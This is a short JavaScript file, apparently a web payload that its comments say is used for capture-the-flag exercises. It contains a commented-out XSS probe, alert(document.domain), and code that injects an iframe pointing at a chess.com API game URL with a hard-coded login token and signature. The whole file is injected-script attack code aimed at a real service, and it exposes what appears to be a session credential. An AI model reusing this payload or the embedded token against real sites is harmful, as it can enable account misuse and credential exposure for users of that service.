//alert(document.domain)
function prepareFrame() {
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", "http://api.chess.com/v1/games/35000530?loginToken=460bf3fb5ee46c7f0421a1605972755e&signed=docs1.3-2f3087f09de32e339fb7157308e0f644e05dc803/");
    ifrm.style.width = "640px";
    ifrm.style.height = "480px";
    document.body.appendChild(ifrm);
}
prepareFrame()
//JS file used for ctfs 
//I don't want to harm anyone or anything
// Have a good day :)
